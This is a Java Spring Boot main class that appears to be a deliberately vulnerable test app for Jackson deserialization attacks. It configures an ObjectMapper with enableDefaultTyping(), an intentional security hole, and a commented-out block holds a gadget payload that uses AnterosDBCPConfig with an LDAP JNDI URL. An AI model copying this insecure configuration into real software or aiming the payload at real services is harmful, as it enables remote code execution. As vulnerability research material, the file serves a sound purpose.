package com.acme.foo;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.web.servlet.support.SpringBootServletInitializer;
import org.springframework.cache.annotation.EnableCaching;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.context.annotation.Configuration;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.deser.impl.CreatorCollector;

@Configuration
@ComponentScan({"com.acme.foo"})
@EnableAutoConfiguration
@SpringBootApplication
@EnableCaching
public class MainController extends SpringBootServletInitializer {

	public static void main(String[] args) {
		SpringApplication.run(MainController.class, args);

        // The following is useful to test whether the deserialization of the gadget works indepenently of the invocation of the REST endpoint.
        /*ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        String json = "{ \"id\" : 2,\n" + //
                        "  \"firstname\" : \"John2\",\n" + //
                        "  \"lastname\" : \"Doe2\",\n" + //
                        "  \"createdAt\" : \"2024-02-19T10:35:20.867+0000\",\n" + //
                        "  \"modifiedAt\" : [\"br.com.anteros.dbcp.AnterosDBCPConfig\", {\"healthCheckRegistry\": \"ldap://localhost:1389/obj\"}]\n" + //
                        "}'";
        try {
            mapper.readValue(json, Person.class);
        } catch (IOException e) {
            e.printStackTrace();
        }*/

        CreatorCollector coll = new CreatorCollector(null, null);
        coll.addDelegatingCreator(null, true, null, 0);

	}   
	
	@Bean
    public ObjectMapper objectMapper() {
        final ObjectMapper mapper = new ObjectMapper();
        // mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false);
        // mapper.configure(MapperFeature.DEFAULT_VIEW_INCLUSION, false);
        mapper.enableDefaultTyping();//DefaultTyping.JAVA_LANG_OBJECT, As.WRAPPER_ARRAY);
        return mapper;
    }
}